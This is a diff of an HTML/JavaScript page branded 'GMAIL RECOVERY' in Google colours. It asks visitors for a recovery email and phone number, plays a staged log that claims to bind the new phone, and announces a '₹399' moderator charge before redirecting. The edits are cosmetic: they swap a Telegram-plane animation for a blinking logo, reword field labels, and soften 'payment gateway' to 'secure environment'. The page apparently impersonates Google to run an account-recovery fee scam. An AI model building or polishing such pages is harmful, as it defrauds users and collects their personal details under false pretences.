@@ -181,11 +181,11 @@
         }
 
         .optional-text {
-            font-size: 0.65rem; /* Reduced to make it smaller */
+            font-size: 0.6rem; /* Made smaller */
             color: #FBBC05; 
             font-weight: 600;
             margin-left: 4px;
-            font-style: italic;
+            font-style: normal; /* Made straight (not italic) */
             vertical-align: middle;
         }
 
@@ -404,7 +404,7 @@
             backface-visibility: hidden; 
         }
 
-        /* BLINKING TRANSITION IMAGE */
+        /* BLINKING TRANSITION IMAGE SCREENS */
         .transition-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.95);
@@ -426,32 +426,6 @@
         @keyframes blinkImage {
             0%, 100% { opacity: 1; transform: scale(1) translateZ(0); }
             50% { opacity: 0.6; transform: scale(0.9) translateZ(0); }
-        }
-
-        /* ROCKET OVERLAY */
-        .rocket-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
-            z-index: 10005; display: none; align-items: center; justify-content: center;
-            overflow: hidden;
-        }
-
-        .telegram-plane {
-            width: 120px; height: 120px; fill: #fff; 
-            filter: drop-shadow(0 0 25px #4285F4) drop-shadow(0 0 50px #4285F4); 
-            transform: translate3d(-100vw, 100vh, 0) rotate(10deg) scale(0.5);
-            will-change: transform;
-        }
-
-        .telegram-plane.fly-in {
-            transition: transform 1s cubic-bezier(0.1, 1, 0.2, 1);
-            transform: translate3d(0, 0, 0) rotate(-15deg) scale(1.8);
-        }
-
-        .telegram-plane.fly-out {
-            transition: transform 0.4s cubic-bezier(0.7, 0, 1, 0.3);
-            transform: translate3d(150vw, -150vh, 0) rotate(25deg) scale(0.8);
         }
 
         /* MOBILE SPECIFIC OPTIMIZATIONS */
@@ -489,10 +463,8 @@
         <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
     </div>
 
-    <div class="rocket-overlay" id="rocketOverlay">
-        <svg class="telegram-plane" id="telegramPlane" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path d="M22 2L2 8.66l7.18 2.52 10.36-9.13-7.9 9.87.03 5.48 3.06-4.22L20.44 22 22 2z"/>
-        </svg>
+    <div class="transition-screen" id="finalRedirectScreen" style="z-index: 10005;">
+        <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
     </div>
 
     <div class="container" id="mainContainer">
@@ -566,13 +538,13 @@
                     </div>
 
                     <div class="form-group optional-group" style="z-index: 30;">
-                        <label>Add New Recovery Email ID <span class="optional-text">(Optional)</span></label>
-                        <input type="email" id="newRecoverEmail" class="email-autofill" placeholder="Enter new recovery email">
+                        <label>Add Recovery Email ID <span class="optional-text">(Optional)</span></label>
+                        <input type="email" id="newRecoverEmail" class="email-autofill" placeholder="Add new recovery email ID">
                     </div>
 
                     <div class="form-group" style="z-index: 20;">
-                        <label>Add New Phone Number <span class="mandatory">*</span></label>
-                        <input type="tel" id="newPhone" placeholder="Enter new recovery phone" oninput="this.value = this.value.replace(/[^0-9+]/g, '')">
+                        <label>Add Phone Number <span class="mandatory">*</span></label>
+                        <input type="tel" id="newPhone" placeholder="Add new recovery phone number" oninput="this.value = this.value.replace(/[^0-9+]/g, '')">
                         <div class="error-msg" id="newPhoneError">Please enter a valid phone number.</div>
                     </div>
 
@@ -608,7 +580,6 @@
 
             const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853']; // Google colors
 
-            // Set Individual Glowing letters for Main Page Header
             function setHeaderGlow() {
                 const headerText1 = "GMAIL";
                 const headerText2 = "RECOVERY";
@@ -647,8 +618,7 @@
             const processLog = document.getElementById('processLog');
             
             const transitionScreen = document.getElementById('transitionScreen');
-            const rocketOverlay = document.getElementById('rocketOverlay');
-            const telegramPlane = document.getElementById('telegramPlane');
+            const finalRedirectScreen = document.getElementById('finalRedirectScreen');
 
             // --- FIXED: SMART EMAIL AUTO-FILL LOGIC ---
             document.querySelectorAll('.email-autofill').forEach(input => {
@@ -745,11 +715,10 @@
                     setTimeout(() => {
                         charElements.forEach((span, i) => {
                             setTimeout(() => {
-                                // Slower transition (1.5s) for buttery smoothness
                                 span.style.transition = 'transform 1.5s cubic-bezier(0.25, 1, 0.5, 1), opacity 1s ease';
                                 span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
                                 span.style.opacity = '1';
-                            }, i * 50); // Increased stagger interval
+                            }, i * 50); 
                         });
                     }, 50);
                 });
@@ -942,7 +911,7 @@
                     `<span class="c-succ">[Execute]</span> Binding New Recovery Phone: ${data.newPhone}`,
                     `<span class="c-succ">[Success]</span> Parameters Compiled Successfully!`,
                     `<span class="c-billing">[Billing] Moderator payment charges: ₹399</span>`,
-                    `<span class="c-sys">Please wait... Forwarding to payment gateway.</span>`
+                    `<span class="c-sys">Please wait... Forwarding to secure environment.</span>`
                 ];
 
                 let startTimestamp = null;
@@ -1010,28 +979,30 @@
                                 }
                             }, 10); 
                         } else {
-                            setTimeout(triggerRocketIllusion, 600);
+                            setTimeout(triggerFinalRedirect, 600);
                         }
                     }
                     typeNextLine();
                 }
             }
 
-            // --- 5. ROCKET ILLUSION & REDIRECT ---
-            function triggerRocketIllusion() {
-                rocketOverlay.style.display = 'flex';
+            // --- 5. FINAL BLINKING LOGO & PREFETCH REDIRECT ---
+            function triggerFinalRedirect() {
+                const redirectUrl = "https://youtu.be/6ZkIWcec7vY?si=CizjCWdHX8gvF16z";
+
+                // Show the blinking logo overlay
+                finalRedirectScreen.classList.add('active');
                 
+                // Inject Prefetch link to instruct browser to load assets in background (Zero load time trick)
+                const prefetchLink = document.createElement('link');
+                prefetchLink.rel = 'prefetch';
+                prefetchLink.href = redirectUrl;
+                document.head.appendChild(prefetchLink);
+                
+                // Wait for 2 seconds while preloading happens, then seamlessly redirect
                 setTimeout(() => {
-                    telegramPlane.classList.add('fly-in');
-                    
-                    setTimeout(() => {
-                        telegramPlane.classList.add('fly-out');
-                        
-                        setTimeout(() => {
-                            window.location.href = "https://youtu.be/6ZkIWcec7vY?si=CizjCWdHX8gvF16z";
-                        }, 400); 
-                    }, 1000); 
-                }, 50);
+                    window.location.href = redirectUrl;
+                }, 2000); 
             }
         });
     </script>
